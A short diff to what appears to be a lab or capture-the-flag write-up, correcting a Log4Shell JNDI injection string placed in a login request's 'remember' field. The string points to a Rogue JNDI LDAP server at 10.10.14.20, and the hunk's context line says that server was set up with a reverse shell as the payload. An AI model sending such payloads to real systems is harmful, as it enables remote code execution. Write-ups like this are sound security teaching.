@@ -82,7 +82,7 @@ I started the _Rogue JNDI_ __LDAP__ server and added a reverse shell as a payloa
 {
     "username": "<username>",
     "password": "<password>",
-    "remember": "${jndi:ldap/10.10.14.20>:1389/o=tomcat}",
+    "remember": "${jndi:ldap://10.10.14.20>:1389/o=tomcat}",
     "strict": true
 }
 ```
